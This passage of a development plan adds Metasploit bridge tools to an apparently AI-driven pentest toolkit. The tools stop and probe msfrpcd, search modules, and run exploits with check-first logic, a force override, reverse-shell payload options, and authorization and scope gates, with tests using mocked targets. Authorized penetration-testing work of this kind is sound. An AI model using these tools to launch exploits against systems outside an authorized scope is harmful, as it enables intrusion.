    except (ProcessLookupError, PermissionError, OSError) as e:
        return format_error(f"failed to send SIGTERM to {pid}: {e}")

    deadline = time.time() + 10.0
    while time.time() < deadline:
        if not _process_alive(pid):
            break
        time.sleep(0.5)

    timed_out = _process_alive(pid)
    if timed_out and force:
        try:
            os.kill(pid, signal.SIGKILL)
        except (ProcessLookupError, PermissionError, OSError):
            pass
        time.sleep(0.5)
        timed_out = _process_alive(pid)

    if timed_out:
        # Did not die even after escalation
        return format_error(
            f"msfrpcd (pid {pid}) did not exit after SIGTERM"
            f"{' + SIGKILL' if force else ''}. Investigate manually.\n"
            f"  status:  stop_timeout"
        )

    _remove_pidfile()

    warning = None
    if sessions_lost > 0:
        warning = f"{sessions_lost} open session(s) killed when daemon stopped"

    lines = [
        f"msfrpcd stopped.",
        f"  status:        stopped",
        f"  pid_was:       {pid}",
        f"  sessions_lost: {sessions_lost}",
    ]
    if warning:
        lines.append(f"  warning:       {warning}")
    return format_tool_result("\n".join(lines))


TOOLS.append(metasploit_stop)
```

- [ ] **Step 4: Run tests to verify they pass**

Run:
```
.devenv/state/venv/bin/pytest tests/test_metasploit_lifecycle.py -v
```
Expected: PASS — 10 tests (6 start + 4 stop).

- [ ] **Step 5: Commit**

```bash
git -C .worktrees/metasploit-bridge add src/reverser/tools/metasploit.py tests/test_metasploit_lifecycle.py
git -C .worktrees/metasploit-bridge commit -m "feat(metasploit): metasploit_stop with sessions-open warning"
```

---

## Task 10: metasploit_status tool

**Files:**
- Modify: `src/reverser/tools/metasploit.py` (add tool)
- Modify: `tests/test_metasploit_lifecycle.py` (add tests)

Read-only probe. Does NOT auto-start. Reports daemon state, auth ok/error, active workspace, all workspaces, open sessions.

- [ ] **Step 1: Write the failing tests**

Append to `tests/test_metasploit_lifecycle.py`:

```python
# ── metasploit_status ───────────────────────────────────────────────


def test_metasploit_status_daemon_not_running(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import metasploit_status
    result = _call(metasploit_status, {})
    assert result.get("is_error") is not True
    text = result["content"][0]["text"]
    assert "not running" in text.lower() or "not_running" in text.lower()


def test_metasploit_status_stale_pidfile(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import metasploit_status, _write_pidfile
    _write_pidfile(2_000_000_000)  # bogus PID
    result = _call(metasploit_status, {})
    text = result["content"][0]["text"]
    # Should still report not-running (stale pidfile detected)
    assert "not running" in text.lower() or "not_running" in text.lower() or "stale" in text.lower()


def test_metasploit_status_daemon_running(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import metasploit_status, _write_pidfile
    _write_pidfile(os.getpid())  # self-pid for liveness

    fake_client = MagicMock()
    fake_client.core.version = {"version": "6.4.0"}
    fake_client.sessions.list = {
        "1": {"type": "meterpreter", "target_host": "10.10.10.5",
              "opened_at": "2026-05-11T12:00:00"},
    }
    fake_console = MagicMock()
    fake_console.run_with_output.return_value = (
        "Workspaces\n"
        "==========\n"
        "  current  name\n"
        "  -------  ----\n"
        "  *        10.10.10.5\n"
        "           default\n"
    )
    fake_client.consoles.console.return_value = fake_console

    with patch("reverser.tools.metasploit._make_msfrpc_client",
               return_value=fake_client):
        result = _call(metasploit_status, {})

    assert result.get("is_error") is not True
    text = result["content"][0]["text"]
    assert str(os.getpid()) in text
    assert "running" in text.lower()
    assert "6.4.0" in text or "version" in text.lower()
    assert "10.10.10.5" in text  # workspace OR session host


def test_metasploit_status_auth_error(tmp_targets_dir, monkeypatch):
    """Daemon process is alive but auth fails — surface the auth error."""
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import metasploit_status, _write_pidfile
    _write_pidfile(os.getpid())

    with patch("reverser.tools.metasploit._make_msfrpc_client",
               side_effect=PermissionError("bad password")):
        result = _call(metasploit_status, {})

    assert result.get("is_error") is not True
    text = result["content"][0]["text"]
    assert "auth" in text.lower() or "error" in text.lower()
```

- [ ] **Step 2: Run tests to verify they fail**

Run:
```
.devenv/state/venv/bin/pytest tests/test_metasploit_lifecycle.py -v
```
Expected: FAIL — `metasploit_status` not yet defined.

- [ ] **Step 3: Write the implementation**

Append to `src/reverser/tools/metasploit.py`:

```python
def _parse_workspace_list(console_output: str) -> tuple[list[str], str | None]:
    """Parse msfconsole `workspace` output → (all_workspaces, active).

    Format:
      Workspaces
      ==========
        current  name
        -------  ----
        *        myws
                 default
    """
    workspaces: list[str] = []
    active: str | None = None
    for line in console_output.splitlines():
        s = line.strip()
        if not s or s.startswith(("Workspaces", "===", "current", "---")):
            continue
        if s.startswith("*"):
            # active workspace
            name = s.lstrip("*").strip()
            if name:
                workspaces.append(name)
                active = name
        else:
            workspaces.append(s)
    return workspaces, active


@tool(
    "metasploit_status",
    "Report msfrpcd daemon state. Read-only: does not auto-start, does not "
    "auto-fix. Returns daemon liveness, version, auth ok/error, active "
    "workspace, all workspaces, and open sessions.",
    {
        "type": "object",
        "properties": {},
        "required": [],
    },
)
async def metasploit_status(args: dict) -> dict:
    try:
        require_pentest_auth()
    except AuthorizationError as e:
        return format_error(str(e))

    pid = _read_pidfile()
    if pid is None:
        return format_tool_result(
            "msfrpcd status:\n"
            "  daemon:   not_running (no pidfile)\n"
            "  start with: metasploit_start"
        )

    if not _process_alive(pid):
        return format_tool_result(
            f"msfrpcd status:\n"
            f"  daemon:   not_running (pidfile is stale; pid {pid} dead)\n"
            f"  start with: metasploit_start (will recover stale pidfile)"
        )

    # Daemon is alive — probe RPC
    auth_ok = True
    auth_err: str | None = None
    version: str | None = None
    workspaces: list[str] = []
    active_workspace: str | None = None
    sessions: list[dict] = []

    try:
        auth = _read_or_create_auth()
        client = _make_msfrpc_client(auth)
        v = client.core.version
        if isinstance(v, dict):
            version = v.get("version", "?")
        else:
            version = str(v)

        # Workspaces via console
        try:
            console = client.consoles.console()
            ws_out = console.run_with_output("workspace")
            workspaces, active_workspace = _parse_workspace_list(ws_out)
        except Exception:
            pass

        # Sessions
        try:
            for sid, info in (client.sessions.list or {}).items():
                sessions.append({
                    "id": sid,
                    "type": (info or {}).get("type", "?"),
                    "target_host": (info or {}).get("target_host", "?"),
                })
        except Exception:
            pass
    except Exception as e:
        auth_ok = False
        auth_err = f"{type(e).__name__}: {e}"

    lines = [
        "msfrpcd status:",
        f"  daemon:           running (pid {pid})",
        f"  version:          {version or '<unknown>'}",
        f"  auth:             {'ok' if auth_ok else 'FAILED'}",
    ]
    if auth_err:
        lines.append(f"  auth_error:       {auth_err}")
    lines.append(f"  active_workspace: {active_workspace or '<unknown>'}")
    if workspaces:
        lines.append(f"  workspaces:       {', '.join(workspaces)}")
    if sessions:
        lines.append(f"  sessions ({len(sessions)}):")
        for s in sessions:
            lines.append(
                f"    [{s['id']}] {s['type']} → {s['target_host']}"
            )
    else:
        lines.append("  sessions:         (none)")

    return format_tool_result("\n".join(lines))


TOOLS.append(metasploit_status)
```

- [ ] **Step 4: Run tests to verify they pass**

Run:
```
.devenv/state/venv/bin/pytest tests/test_metasploit_lifecycle.py -v
```
Expected: PASS — 14 tests (6 start + 4 stop + 4 status).

- [ ] **Step 5: Commit**

```bash
git -C .worktrees/metasploit-bridge add src/reverser/tools/metasploit.py tests/test_metasploit_lifecycle.py
git -C .worktrees/metasploit-bridge commit -m "feat(metasploit): metasploit_status tool"
```

---

## Task 11: Register lifecycle tools in registry

**Files:**
- Modify: `tests/test_tool_registry.py`

ALL_TOOLS goes 71 → 74 with start/stop/status auto-registered via `TOOLS.append(...)`. Update the count assertion + visibility tests.

- [ ] **Step 1: Write the failing tests**

Modify `tests/test_tool_registry.py`:

Replace:
```python
    assert len(ALL_TOOLS) == 71, (
        f"expected 71 registered tools, got {len(ALL_TOOLS)}"
    )
    unique_names = {t.name for t in ALL_TOOLS}
    assert len(unique_names) == 69, (
        f"expected 69 unique tools (with 2 pre-existing dups), got {len(unique_names)}"
    )
```

with:
```python
    assert len(ALL_TOOLS) == 74, (
        f"expected 74 registered tools, got {len(ALL_TOOLS)}"
    )
    unique_names = {t.name for t in ALL_TOOLS}
    assert len(unique_names) == 72, (
        f"expected 72 unique tools (with 2 pre-existing dups), got {len(unique_names)}"
    )
```

Add at bottom:

```python
def test_metasploit_lifecycle_tools_registered():
    names = {t.name for t in ALL_TOOLS}
    assert "metasploit_start" in names
    assert "metasploit_stop" in names
    assert "metasploit_status" in names
```

- [ ] **Step 2: Run tests to verify they fail**

Run:
```
.devenv/state/venv/bin/pytest tests/test_tool_registry.py -v
```
Expected: PASS for the new lifecycle assertion (tools auto-registered), FAIL for the count (says 74 expected, actual is now 74 if Tasks 8-10 all ran). Run to confirm.

If FAIL for count assertion update wasn't applied yet: apply Step 1.

- [ ] **Step 3: Apply patch shown in Step 1**

- [ ] **Step 4: Run tests to verify they pass**

Run:
```
.devenv/state/venv/bin/pytest tests/test_tool_registry.py -v
```
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git -C .worktrees/metasploit-bridge add tests/test_tool_registry.py
git -C .worktrees/metasploit-bridge commit -m "test(registry): assert metasploit lifecycle tools (ALL_TOOLS 71→74)"
```

---

## Task 12: metasploit_search tool

**Files:**
- Modify: `src/reverser/tools/metasploit.py` (add tool)
- Create: `tests/test_metasploit_operations.py`

Calls `client.modules.search(query)` and returns ranked candidates. Read-only — no KB writes.

- [ ] **Step 1: Write the failing tests**

Create `tests/test_metasploit_operations.py`:

```python
"""Tests for metasploit_search / _run / _session — the operational tools.

Uses mocked pymetasploit3.MsfRpcClient throughout. No daemon required.
"""

import asyncio
import os
from unittest.mock import patch, MagicMock

import pytest


def _call(tool_obj, args):
    fn = getattr(tool_obj, "handler", None) or getattr(tool_obj, "fn", None) or tool_obj
    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(fn(args))
    finally:
        loop.close()


# ── metasploit_search ───────────────────────────────────────────────


_FAKE_MODULE_RESULTS = [
    {
        "fullname": "exploit/multi/http/proftpd_modcopy_exec",
        "type": "exploit",
        "platform": "linux",
        "rank": "great",
        "disclosure_date": "2015-04-07",
        "description": "ProFTPd 1.3.5 mod_copy RCE",
        "ref": ["CVE-2015-3306"],
    },
    {
        "fullname": "auxiliary/scanner/ftp/ftp_login",
        "type": "auxiliary",
        "platform": "",
        "rank": "normal",
        "disclosure_date": "",
        "description": "FTP login brute-force",
        "ref": [],
    },
]


def test_metasploit_search_returns_modules(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import metasploit_search, _write_pidfile
    _write_pidfile(os.getpid())  # daemon alive

    fake_client = MagicMock()
    fake_client.modules.search.return_value = _FAKE_MODULE_RESULTS
    with patch("reverser.tools.metasploit._make_msfrpc_client",
               return_value=fake_client):
        result = _call(metasploit_search, {"query": "proftpd"})

    assert result.get("is_error") is not True
    text = result["content"][0]["text"]
    assert "proftpd_modcopy_exec" in text
    assert "great" in text
    fake_client.modules.search.assert_called_with("proftpd")


def test_metasploit_search_filters_by_type(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import metasploit_search, _write_pidfile
    _write_pidfile(os.getpid())

    fake_client = MagicMock()
    fake_client.modules.search.return_value = _FAKE_MODULE_RESULTS
    with patch("reverser.tools.metasploit._make_msfrpc_client",
               return_value=fake_client):
        result = _call(metasploit_search, {"query": "proftpd", "type": "exploit"})

    text = result["content"][0]["text"]
    assert "proftpd_modcopy_exec" in text
    # auxiliary should be filtered out
    assert "ftp_login" not in text


def test_metasploit_search_filters_by_platform(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import metasploit_search, _write_pidfile
    _write_pidfile(os.getpid())

    fake_client = MagicMock()
    fake_client.modules.search.return_value = _FAKE_MODULE_RESULTS
    with patch("reverser.tools.metasploit._make_msfrpc_client",
               return_value=fake_client):
        result = _call(metasploit_search, {"query": "proftpd", "platform": "linux"})

    text = result["content"][0]["text"]
    assert "proftpd_modcopy_exec" in text


def test_metasploit_search_filters_by_rank(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import metasploit_search, _write_pidfile
    _write_pidfile(os.getpid())

    fake_client = MagicMock()
    fake_client.modules.search.return_value = _FAKE_MODULE_RESULTS
    with patch("reverser.tools.metasploit._make_msfrpc_client",
               return_value=fake_client):
        result = _call(metasploit_search, {"query": "proftpd", "rank": "great"})

    text = result["content"][0]["text"]
    assert "proftpd_modcopy_exec" in text
    assert "ftp_login" not in text  # rank=normal filtered out


def test_metasploit_search_daemon_not_running(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import metasploit_search
    # No pidfile
    result = _call(metasploit_search, {"query": "proftpd"})
    assert result.get("is_error") is True
    assert "metasploit_start" in result["content"][0]["text"]
```

- [ ] **Step 2: Run tests to verify they fail**

Run:
```
.devenv/state/venv/bin/pytest tests/test_metasploit_operations.py -v
```
Expected: FAIL — `metasploit_search` not defined.

- [ ] **Step 3: Write the implementation**

Append to `src/reverser/tools/metasploit.py`:

```python
# ── Operational tools: search / run / session ───────────────────────


_RANK_ORDER = {
    "excellent": 6,
    "great":     5,
    "good":      4,
    "normal":    3,
    "average":   2,
    "low":       1,
    "manual":    0,
}


def _require_daemon_running() -> dict | None:
    """If daemon isn't up, return an error tool result. Otherwise None."""
    pid = _read_pidfile()
    if pid is None or not _process_alive(pid):
        return format_error(
            "msfrpcd is not running. Start it with metasploit_start <target> first."
        )
    return None


def _filter_modules(modules: list[dict], *,
                    type_: str | None,
                    platform: str | None,
                    rank: str | None) -> list[dict]:
    """Apply type/platform/rank filters to MSF search results."""
    out = []
    rank_min = _RANK_ORDER.get(rank.lower(), 0) if rank else 0
    for m in modules:
        if type_ and (m.get("type") or "").lower() != type_.lower():
            continue
        if platform:
            mp = (m.get("platform") or "").lower()
            if platform.lower() not in mp:
                continue
        m_rank = (m.get("rank") or "").lower()
        if rank and _RANK_ORDER.get(m_rank, 0) < rank_min:
            continue
        out.append(m)
    return out


@tool(
    "metasploit_search",
    "Search Metasploit modules via msfrpcd. Filter by type "
    "(exploit/auxiliary/post/payload), platform, and rank. Returns ranked "
    "candidates. Requires metasploit_start.",
    {
        "type": "object",
        "properties": {
            "query": {"type": "string",
                      "description": "Search query (e.g. 'cve:2015-3306' or 'name:proftpd')"},
            "type": {"type": "string",
                     "description": "Filter: exploit, auxiliary, post, payload"},
            "platform": {"type": "string",
                         "description": "Filter: linux, windows, multi, ..."},
            "rank": {"type": "string",
                     "description": "Minimum rank: manual/low/average/normal/good/great/excellent"},
            "limit": {"type": "integer", "default": 25,
                      "description": "Max modules returned (default 25)"},
        },
        "required": ["query"],
    },
)
async def metasploit_search(args: dict) -> dict:
    try:
        require_pentest_auth()
    except AuthorizationError as e:
        return format_error(str(e))

    err = _require_daemon_running()
    if err:
        return err

    query = args["query"]
    type_ = args.get("type") or None
    platform = args.get("platform") or None
    rank = args.get("rank") or None
    limit = int(args.get("limit", 25))

    try:
        auth = _read_or_create_auth()
        client = _make_msfrpc_client(auth)
        raw_modules = client.modules.search(query) or []
    except Exception as e:
        return format_error(f"module.search failed: {type(e).__name__}: {e}")

    filtered = _filter_modules(raw_modules,
                               type_=type_, platform=platform, rank=rank)
    total = len(filtered)
    shown = filtered[:limit]

    if not shown:
        return format_tool_result(
            f"No modules found for query={query!r} "
            f"(type={type_}, platform={platform}, rank={rank})."
        )

    lines = [f"Module search results for {query!r} "
             f"(showing {len(shown)} of {total}):", ""]
    for m in shown:
        refs = m.get("ref") or []
        cve = next((r for r in refs if str(r).upper().startswith("CVE-")), "")
        cve_str = f" [{cve}]" if cve else ""
        lines.append(f"  {m.get('fullname', '<?>')}")
        lines.append(f"    type={m.get('type','?')}  platform={m.get('platform','?')}  "
                     f"rank={m.get('rank','?')}  date={m.get('disclosure_date','')}{cve_str}")
        desc = (m.get("description") or "").strip().replace("\n", " ")
        if desc:
            lines.append(f"    {desc[:200]}")
        lines.append("")

    return format_tool_result("\n".join(lines))


TOOLS.append(metasploit_search)
```

- [ ] **Step 4: Run tests to verify they pass**

Run:
```
.devenv/state/venv/bin/pytest tests/test_metasploit_operations.py -v
```
Expected: PASS — 5 tests.

- [ ] **Step 5: Commit**

```bash
git -C .worktrees/metasploit-bridge add src/reverser/tools/metasploit.py tests/test_metasploit_operations.py
git -C .worktrees/metasploit-bridge commit -m "feat(metasploit): metasploit_search with type/platform/rank filters"
```

---

## Task 13: metasploit_run — check-then-exploit decision matrix

**Files:**
- Modify: `src/reverser/tools/metasploit.py` (add tool)
- Modify: `tests/test_metasploit_operations.py` (add tests)

The behavioral heart of the bridge. Per D7, always-check-first by default. Each row of the decision matrix (Section 5.7 of the spec) needs a test:

| Check result | Default behavior | With force=True |
|---|---|---|
| `vulnerable` | Run exploit | Run exploit |
| `safe` | Skip exploit | Run exploit |
| `unknown` / `detected` | Skip exploit | Run exploit |
| `no_check_method` | Skip exploit | Run exploit |

- [ ] **Step 1: Write the failing tests**

Append to `tests/test_metasploit_operations.py`:

```python
# ── metasploit_run: decision matrix ─────────────────────────────────


def _fake_module(check_code: str | None, exploit_returns_session: bool):
    """Build a fake MSF module object.

    check_code: one of None (no_check_method), "vulnerable", "safe",
                "unknown", "detected", "error"
    exploit_returns_session: if True, .execute() returns a job_id that
                             eventually yields a session in sessions.list
    """
    mod = MagicMock()
    mod._opts = {}
    mod.__setitem__ = lambda self, k, v: mod._opts.__setitem__(k, v)
    mod.__getitem__ = lambda self, k: mod._opts[k]

    if check_code is None:
        # No check method — pymetasploit3 raises here in real use; we model
        # by raising NotImplementedError when .check_exploit() is called.
        mod.check_exploit.side_effect = NotImplementedError("no check method")
    else:
        mod.check_exploit.return_value = {"code": check_code,
                                          "message": f"check returned {check_code}"}

    if exploit_returns_session:
        mod.execute.return_value = {"job_id": 1, "uuid": "abcd"}
    else:
        mod.execute.return_value = {"job_id": None}
    return mod


def _client_with_module(mod, *, sessions_after_exploit: dict | None = None):
    client = MagicMock()
    client.modules.use.return_value = mod
    client.sessions.list = sessions_after_exploit or {}
    return client


def _setup_run_test(monkeypatch, *, check_code, exploit_yields_session=False,
                    sessions=None):
    """Common harness for metasploit_run tests. Returns (client, mod, _call_target)."""
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    mod = _fake_module(check_code, exploit_yields_session)
    client = _client_with_module(mod, sessions_after_exploit=sessions)
    return client, mod


def test_run_check_vulnerable_runs_exploit(tmp_targets_dir, monkeypatch):
    from reverser.tools.metasploit import metasploit_run, _write_pidfile
    _write_pidfile(os.getpid())
    client, mod = _setup_run_test(monkeypatch, check_code="vulnerable",
                                   exploit_yields_session=True,
                                   sessions={"1": {"type": "meterpreter",
                                                   "target_host": "10.10.10.5"}})
    with patch("reverser.tools.metasploit._make_msfrpc_client", return_value=client):
        result = _call(metasploit_run, {
            "module": "exploit/multi/http/proftpd_modcopy_exec",
            "options": {"RHOSTS": "10.10.10.5", "RPORT": 80},
            "target": "10.10.10.5",
        })
    text = result["content"][0]["text"]
    assert "vulnerable" in text.lower()
    assert "session" in text.lower()
    mod.execute.assert_called()  # exploit fired


def test_run_check_safe_skips_exploit(tmp_targets_dir, monkeypatch):
    from reverser.tools.metasploit import metasploit_run, _write_pidfile
    _write_pidfile(os.getpid())
    client, mod = _setup_run_test(monkeypatch, check_code="safe")
    with patch("reverser.tools.metasploit._make_msfrpc_client", return_value=client):
        result = _call(metasploit_run, {
            "module": "exploit/multi/http/proftpd_modcopy_exec",
            "options": {"RHOSTS": "10.10.10.5"},
            "target": "10.10.10.5",
        })
    text = result["content"][0]["text"]
    assert "safe" in text.lower()
    assert "skip" in text.lower() or "not" in text.lower()
    mod.execute.assert_not_called()


def test_run_check_unknown_skips_exploit(tmp_targets_dir, monkeypatch):
    from reverser.tools.metasploit import metasploit_run, _write_pidfile
    _write_pidfile(os.getpid())
    client, mod = _setup_run_test(monkeypatch, check_code="unknown")
    with patch("reverser.tools.metasploit._make_msfrpc_client", return_value=client):
        result = _call(metasploit_run, {
            "module": "exploit/multi/http/proftpd_modcopy_exec",
            "options": {"RHOSTS": "10.10.10.5"},
            "target": "10.10.10.5",
        })
    text = result["content"][0]["text"]
    assert "unknown" in text.lower()
    mod.execute.assert_not_called()


def test_run_no_check_method_skips_exploit_by_default(tmp_targets_dir, monkeypatch):
    from reverser.tools.metasploit import metasploit_run, _write_pidfile
    _write_pidfile(os.getpid())
    client, mod = _setup_run_test(monkeypatch, check_code=None)
    with patch("reverser.tools.metasploit._make_msfrpc_client", return_value=client):
        result = _call(metasploit_run, {
            "module": "exploit/multi/http/proftpd_modcopy_exec",
            "options": {"RHOSTS": "10.10.10.5"},
            "target": "10.10.10.5",
        })
    text = result["content"][0]["text"]
    assert "no_check_method" in text.lower() or "no check method" in text.lower()
    mod.execute.assert_not_called()


def test_run_force_overrides_safe_check(tmp_targets_dir, monkeypatch):
    from reverser.tools.metasploit import metasploit_run, _write_pidfile
    _write_pidfile(os.getpid())
    client, mod = _setup_run_test(monkeypatch, check_code="safe",
                                   exploit_yields_session=False)
    with patch("reverser.tools.metasploit._make_msfrpc_client", return_value=client):
        result = _call(metasploit_run, {
            "module": "exploit/multi/http/proftpd_modcopy_exec",
            "options": {"RHOSTS": "10.10.10.5"},
            "target": "10.10.10.5",
            "force": True,
        })
    text = result["content"][0]["text"]
    assert "safe" in text.lower()
    mod.execute.assert_called()  # force bypasses skip


def test_run_force_overrides_no_check_method(tmp_targets_dir, monkeypatch):
    from reverser.tools.metasploit import metasploit_run, _write_pidfile
    _write_pidfile(os.getpid())
    client, mod = _setup_run_test(monkeypatch, check_code=None)
    with patch("reverser.tools.metasploit._make_msfrpc_client", return_value=client):
        result = _call(metasploit_run, {
            "module": "exploit/multi/http/proftpd_modcopy_exec",
            "options": {"RHOSTS": "10.10.10.5"},
            "target": "10.10.10.5",
            "force": True,
        })
    mod.execute.assert_called()
```

- [ ] **Step 2: Run tests to verify they fail**

Run:
```
.devenv/state/venv/bin/pytest tests/test_metasploit_operations.py -v
```
Expected: FAIL — `metasploit_run` not yet defined.

- [ ] **Step 3: Write the implementation**

Append to `src/reverser/tools/metasploit.py`:

```python
_CHECK_VULNERABLE = ("vulnerable",)
_CHECK_SAFE = ("safe",)
_CHECK_UNKNOWN = ("unknown", "detected")
_CHECK_NO_METHOD = ("no_check_method",)
_CHECK_ERROR = ("error", "appears", "unsupported")


def _classify_check_result(raw: Any, raised: BaseException | None) -> tuple[str, str]:
    """Normalize a check_exploit return value into (code, message).

    code: vulnerable | safe | unknown | detected | no_check_method | error
    """
    if raised is not None:
        # NotImplementedError or AttributeError → no check method
        if isinstance(raised, (NotImplementedError, AttributeError)):
            return ("no_check_method", f"{type(raised).__name__}: {raised}")
        return ("error", f"{type(raised).__name__}: {raised}")

    if isinstance(raw, dict):
        code = (raw.get("code") or "").lower()
        msg = raw.get("message") or ""
        if code in ("vulnerable", "safe", "unknown", "detected",
                    "no_check_method", "error"):
            return (code, msg)
        # MSF sometimes returns Vuln::Code constants as strings
        if "vulnerable" in code:
            return ("vulnerable", msg)
        if "safe" in code:
            return ("safe", msg)
        return ("unknown", msg or str(raw))

    if isinstance(raw, str):
        low = raw.lower()
        for tag in ("vulnerable", "safe", "unknown", "detected"):
            if tag in low:
                return (tag, raw)
        return ("unknown", raw)

    return ("unknown", str(raw))


@tool(
    "metasploit_run",
    "Run a Metasploit module against a target. ALWAYS checks first by "
    "default (D7). Behavior matrix: vulnerable→exploit; safe/unknown/"
    "detected/no_check_method→skip; force=True overrides skip. Records a "
    "high-severity finding when an exploit succeeds. Scope-checked BEFORE "
    "the check fires.",
    {
        "type": "object",
        "properties": {
            "module": {"type": "string",
                       "description": "Full module name (e.g. exploit/multi/http/proftpd_modcopy_exec)"},
            "options": {"type": "object",
                        "description": "Module options (e.g. {'RHOSTS': '10.10.10.5', 'RPORT': 80})"},
            "target": {"type": "string",
                       "description": "Target identifier — for scope check + workspace + KB writes"},
            "payload": {"type": "string", "default": "",
                        "description": "Optional payload module (e.g. windows/x64/meterpreter/reverse_tcp)"},
            "payload_options": {"type": "object", "default": {},
                                "description": "Payload-side options (e.g. {'LHOST': '10.10.14.5'})"},
            "force": {"type": "boolean", "default": False,
                      "description": "Bypass check-then-skip (D7 escape hatch)"},
            "timeout_seconds": {"type": "integer", "default": 300,
                                "description": "Max time to wait for exploit to return"},
        },
        "required": ["module", "options", "target"],
    },
)
async def metasploit_run(args: dict) -> dict:
    try:
        require_pentest_auth()
    except AuthorizationError as e:
        return format_error(str(e))

    err = _require_daemon_running()
    if err:
        return err

    module_name = args["module"]
    options = args.get("options") or {}
    target = args["target"]
    payload_name = args.get("payload") or None
    payload_options = args.get("payload_options") or {}
    force = bool(args.get("force", False))
    timeout_seconds = int(args.get("timeout_seconds", 300))

    # ── Scope check BEFORE check fires (D7 + risk row in spec §12) ──
    from ..kb.scope import load_scope, ScopeError
    scope = load_scope(target)
    if scope is not None:
        try:
            scope.assert_in_scope(target)
        except ScopeError as e:
            return format_error(f"scope.toml violation: {e}")

    # Determine module type from name
    parts = module_name.split("/", 1)
    if len(parts) != 2:
        return format_error(
            f"module name must be 'type/path', got {module_name!r}"
        )
    mod_type, mod_path = parts

    try:
        auth = _read_or_create_auth()
        client = _make_msfrpc_client(auth)
        mod = client.modules.use(mod_type, mod_path)
    except Exception as e:
        return format_error(f"failed to load module {module_name!r}: "
                            f"{type(e).__name__}: {e}")

    # Apply options
    for k, v in options.items():
        try:
            mod[k] = v
        except Exception:
            pass  # MSF may reject unknown options; surfaced via exploit_output

    # ── Check phase ──
    check_raw: Any = None
    check_raised: BaseException | None = None
    try:
        check_raw = mod.check_exploit()
    except BaseException as e:
        check_raised = e

    check_code, check_msg = _classify_check_result(check_raw, check_raised)

    # ── Decision matrix ──
    should_run = (check_code in _CHECK_VULNERABLE) or force

    exploit_ran = False
    exploit_output = ""
    session_id: int | None = None
    decision_note = ""

    if should_run:
        try:
            if payload_name:
                payload_mod = client.modules.use("payload", payload_name)
                for k, v in payload_options.items():
                    try:
                        payload_mod[k] = v
                    except Exception:
                        pass
                exploit_raw = mod.execute(payload=payload_mod)
            else:
                exploit_raw = mod.execute()
            exploit_ran = True
            exploit_output = str(exploit_raw)
            # Best-effort: look for a session in the post-execute session list
            try:
                sessions = client.sessions.list or {}
                for sid, info in sessions.items():
                    if (info or {}).get("target_host") == target or \
                       (info or {}).get("target_host") == options.get("RHOSTS"):
                        try:
                            session_id = int(sid)
                        except (ValueError, TypeError):
                            session_id = None
                        break
            except Exception:
                pass
        except Exception as e:
            exploit_output = f"{type(e).__name__}: {e}"
    else:
        decision_note = (
            f"skipped exploit (check={check_code}); pass force=true to "
            f"override (D7 escape hatch)."
        )

    # ── KB finding on successful exploit ──
    if session_id is not None:
        try:
            from ..kb import FindingFact
            kb = for_target(target)
            kb.record_finding(FindingFact(
                title=f"Exploited {module_name} on {target}",
                severity="high",
                description=(
                    f"Module: {module_name}\n"
                    f"Options: {options}\n"
                    f"Check: {check_code} — {check_msg}\n"
                    f"Session: id={session_id}\n"
                    f"Exploit output (truncated): {exploit_output[:2000]}"
                ),
                evidence_paths=[],
            ))
        except Exception:
            pass

    lines = [
        f"metasploit_run: {module_name}",
        f"  target:        {target}",
        f"  check_result:  {check_code}",
        f"  check_output:  {check_msg[:500]}",
        f"  exploit_ran:   {exploit_ran}",
    ]
    if decision_note:
        lines.append(f"  decision:      {decision_note}")
    if exploit_ran:
        lines.append(f"  exploit_output: {exploit_output[:2000]}")
    if session_id is not None:
        lines.append(f"  session_id:    {session_id}")
        lines.append(f"  finding:       recorded as severity=high")

    return format_tool_result("\n".join(lines))


TOOLS.append(metasploit_run)
```

- [ ] **Step 4: Run tests to verify they pass**

Run:
```
.devenv/state/venv/bin/pytest tests/test_metasploit_operations.py -v
```
Expected: PASS — 11 tests (5 search + 6 run-matrix).

- [ ] **Step 5: Commit**

```bash
git -C .worktrees/metasploit-bridge add src/reverser/tools/metasploit.py tests/test_metasploit_operations.py
git -C .worktrees/metasploit-bridge commit -m "feat(metasploit): metasploit_run with always-check-first matrix"
```

---

## Task 14: metasploit_run — scope enforcement + auto-finding tests

**Files:**
- Modify: `tests/test_metasploit_operations.py` (add tests)

The implementation already handles scope checking (Task 13) and the auto-finding write. This task locks in those behaviors with explicit tests so a future regression cannot silently bypass them. No production code changes.

- [ ] **Step 1: Write the failing tests**

Append to `tests/test_metasploit_operations.py`:

```python
# ── metasploit_run: scope + auto-finding ────────────────────────────


def test_run_scope_violation_before_check(tmp_targets_dir, monkeypatch):
    """If target is out of scope, scope_toml must abort BEFORE check fires."""
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import metasploit_run, _write_pidfile
    _write_pidfile(os.getpid())

    # Write a scope.toml that excludes 10.10.10.5
    target_dir = tmp_targets_dir / "10.10.10.5"
    target_dir.mkdir(parents=True, exist_ok=True)
    (target_dir / "scope.toml").write_text(
        '[scope]\nin_scope_cidrs = ["192.168.0.0/24"]\n'
    )

    mod = MagicMock()
    mod.check_exploit.return_value = {"code": "vulnerable", "message": ""}
    fake_client = MagicMock()
    fake_client.modules.use.return_value = mod

    with patch("reverser.tools.metasploit._make_msfrpc_client",
               return_value=fake_client):
        result = _call(metasploit_run, {
